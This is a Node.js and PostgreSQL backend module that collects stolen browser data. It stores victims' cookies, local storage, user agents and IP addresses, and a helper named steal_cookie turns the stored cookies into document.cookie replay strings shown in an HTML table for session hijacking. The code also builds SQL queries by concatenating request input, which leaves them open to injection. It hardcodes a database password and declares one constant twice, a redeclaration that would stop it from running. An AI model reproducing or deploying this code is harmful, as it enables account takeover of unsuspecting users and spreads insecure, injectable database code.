//const { pool } = require('pg');
//const { Pool } = require("pg");
const jsonToTable = require('json-to-table');

const { Pool } = require("pg");
const jsonToTable = require('json-to-table');

let pool;

if (process.env.DATABASE_URL) {
    // 🌐 Use Render/PostgreSQL in production
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false }
    });
} else {
    // 🖥️ Use local PostgreSQL in development
    pool = new Pool({
        user: 'postgres',
        host: 'localhost',
        database: 'api',
        password: 'Asaboy.10',
        port: 5432
    });
}

async function saveCookies({ timestamp, url, cookies, storage, userAgent }) {
    const query = `
        INSERT INTO cookies (timestamp, url, cookies, storage, user_agent)
        VALUES ($1, $2, $3, $4, $5)
    `;
    const values = [timestamp, url, cookies, JSON.stringify(storage), userAgent];
    await pool.query(query, values);
}


const current_time = () => {
  return new Date(Date.now()).toISOString().replace('T',' ').replace('Z','')
}

const steal_cookie = (name, path, value) => {
  return "document.cookie = \"" + name+ '=' + value + "; path="+path + "\""
}

const createDatabase = (_request, response) => {
    const createDatabaseString = `
    CREATE TABLE IF NOT EXISTS "bugs" (
	    "id" SERIAL,
      "timestamp_col" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      "user_ip" VARCHAR(30),
	    "bug_name" VARCHAR(500) NOT NULL,
      "bug_value" TEXT NOT NULL,
      "bug_domain" VARCHAR(500) NOT NULL,
      "bug_path" VARCHAR(100) NOT NULL,
	    PRIMARY KEY ("id")
    );`;

    pool.query(createDatabaseString, [], (error, _results) => {
        if (error) {
            throw error;
        }
        response.status(200).send(`Database created!`)
    })
}

const resetDatabase = (_request, response) => {
  pool.query('DELETE FROM bugs', (error, _results) => {
    if (error) {
      response.status(400).send(error);
    } else {
      response.status(200).send('Bugs table has been reset.');
    }
  });
};

const clearDatabase = (_request, response) => {
    pool.query('DROP TABLE IF EXISTS bugs;', (error, _results) => {
        if (error) {
            throw error
        }
        response.status(200).send(`Cleared Database!`)

    })
}

const createBug = (request, response) => {
    // response.status(201).send(`Bug added: ${request.query.bug}`)
    const bug = JSON.parse(request.query.bug);

    // response.status(201).send(bug)

    const user_ip = request.ip || request.connection.remoteAddress;

    where_clause = "user_ip='" + user_ip +
        "' AND bug_name='" + bug.name +
        "' AND bug_domain='" + bug.domain +
        "' AND bug_path='" + bug.path + "'"

    query = "SELECT * FROM bugs WHERE " + where_clause

    pool.query(query, (_err, result) => {

        // TODO: check for existing entry and update

        // response.status(201).send(query+ result)

        if (result == undefined || result.rowCount == 0) {

            pool.query('INSERT INTO bugs (user_ip, bug_name, bug_value, bug_domain, bug_path, timestamp_col) VALUES ($1, $2, $3, $4, $5, $6)',
                [user_ip, bug.name, bug.value, bug.domain, bug.path, current_time()],

                (error, _results) => {

                    if (error) {
                        response.status(400).send(error)
                        return;
                    }

                    response.status(201).send(`Bug added: ${[user_ip, bug.name, bug.value, bug.domain, bug.path, new Date()]}`) // TODO: Remove this later

                })

        } else {

            pool.query('UPDATE bugs SET bug_value=\'' + bug.value + '\', timestamp_col=\'' + current_time() + '\' WHERE ' + where_clause,

                (error, _results) => {

                    if (error) {
                        // throw error
                        response.status(400).send(error);
                        return;

                    }

                    response.status(201).send(`Bug updated: ${[user_ip, bug.name, bug.value, bug.domain, bug.path, new Date()]}`) // TODO: Remove this later

                })

        }

    })

}

const getAllBugs = (_request, response) => {
    pool.query('SELECT * FROM bugs', (error, results) => {
        if (error) {
            // throw error
            response.status(400).send(error)
            return;
        }
        response.status(200).json(results.rows)
    })
}

const getAllBugsTable = (_request, response) => {
    pool.query('SELECT * FROM bugs', (error, results) => {
        if (error) {
            // throw error
            response.status(400).send(error)
            return;
        }

        tabled = jsonToTable(results.rows)

        nameidx  = tabled[0].indexOf("bug_name")
        pathidx  = tabled[0].indexOf("bug_path")
        valueidx = tabled[0].indexOf("bug_value")

        for (tab of tabled) {

          tab.push("<a>"+steal_cookie(
            tab[nameidx],
            tab[pathidx],
            tab[valueidx]
          ) + "</a>")

          tab = "<th>" + tab.join("</th></th>") + "</th>"

        }

        tabled[0][tabled[0].length - 1] = "script"

        response.render("table", { tabled: tabled });

    })
}



module.exports = { saveCookies, createBug, resetDatabase, getAllBugs, getAllBugsTable, clearDatabase, createDatabase };
